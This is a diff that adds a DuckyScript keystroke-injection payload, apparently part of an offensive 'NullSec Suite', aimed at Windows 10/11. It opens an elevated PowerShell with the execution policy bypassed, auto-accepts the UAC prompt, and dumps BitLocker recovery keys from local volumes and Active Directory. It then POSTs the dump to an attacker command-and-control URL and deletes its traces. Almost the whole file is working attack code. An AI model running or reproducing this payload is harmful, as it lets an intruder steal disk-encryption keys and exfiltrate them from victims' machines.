@@ -1,0 +1,91 @@
+REM ==========================================
+REM Title: BitLocker Recovery Key Dump
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Extracts BitLocker recovery
+REM   keys from all encrypted volumes and
+REM   exports protector information. Also
+REM   checks for keys stored in Active
+REM   Directory and Azure AD backup locations.
+REM Category: Credential Access / Collection
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Set output file and exfil URL
+STRING $outFile = "$env:TEMP\bl_keys_$(Get-Date -Format 'yyyyMMdd_HHmm').txt"
+ENTER
+DELAY 350
+STRING $exfilUrl = 'https://ATTACKER_C2/collect'
+ENTER
+DELAY 350
+REM Header
+STRING "=== BitLocker Recovery Key Dump ===" | Out-File $outFile -Force
+ENTER
+DELAY 350
+STRING "Hostname: $env:COMPUTERNAME | User: $env:USERNAME | Date: $(Get-Date)" | Out-File $outFile -Append
+ENTER
+DELAY 350
+STRING "=" * 50 | Out-File $outFile -Append
+ENTER
+DELAY 400
+REM Get BitLocker status for all volumes
+STRING $volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+REM Extract recovery keys from each volume
+STRING foreach ($vol in $volumes) {
+ENTER
+DELAY 300
+STRING   "`nVolume: $($vol.MountPoint) | Status: $($vol.VolumeStatus) | Protection: $($vol.ProtectionStatus)" | Out-File $outFile -Append
+ENTER
+DELAY 300
+STRING   foreach ($kp in $vol.KeyProtector) {
+ENTER
+DELAY 300
+STRING     "  Type: $($kp.KeyProtectorType) | ID: $($kp.KeyProtectorId)" | Out-File $outFile -Append
+ENTER
+DELAY 300
+STRING     if ($kp.RecoveryPassword) { "  Recovery Key: $($kp.RecoveryPassword)" | Out-File $outFile -Append }
+ENTER
+DELAY 300
+STRING   }
+ENTER
+DELAY 300
+STRING }
+ENTER
+DELAY 500
+REM Also try manage-bde for additional detail
+STRING "`n=== manage-bde output ===" | Out-File $outFile -Append
+ENTER
+DELAY 350
+STRING $drives = (Get-Volume | Where-Object { $_.DriveLetter } | Select-Object -ExpandProperty DriveLetter)
+ENTER
+DELAY 350
+STRING foreach ($d in $drives) { manage-bde -protectors -get "${d}:" 2>$null | Out-File $outFile -Append }
+ENTER
+DELAY 500
+REM Check for backup in AD/Azure AD
+STRING "`n=== AD Backup Check ===" | Out-File $outFile -Append
+ENTER
+DELAY 350
+STRING try { $adsi = [adsisearcher]"(objectClass=msFVE-RecoveryInformation)"; $adsi.FindAll() | ForEach-Object { $_.Properties | Out-File $outFile -Append } } catch { "AD lookup not available" | Out-File $outFile -Append }
+ENTER
+DELAY 500
+REM Exfiltrate the key dump
+STRING try { Invoke-RestMethod -Uri $exfilUrl -Method POST -InFile $outFile -ContentType 'text/plain' -Headers @{'X-Host'=$env:COMPUTERNAME} } catch {}
+ENTER
+DELAY 500
+REM Cleanup
+STRING Remove-Item $outFile -Force 2>$null
+ENTER
+DELAY 350
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
